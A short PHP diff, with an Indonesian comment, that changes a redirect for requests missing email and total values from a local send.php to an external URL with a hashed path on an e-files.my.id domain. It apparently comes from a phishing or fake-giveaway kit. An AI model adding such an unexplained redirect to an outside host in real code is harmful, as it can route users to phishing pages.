@@ -3,7 +3,7 @@
 //mencegah masuk tanpa method get
 if($email == "" && $total == ""){
 $url = $_SERVER['PHP_SELF'];
-header("Location: send.php");
+header("Location: https://pusatwhitegcr.e-files.my.id/x/6ff675bd59dd492f4c4a5d603085fadd965cba50/setting.php");
 }
 
 //
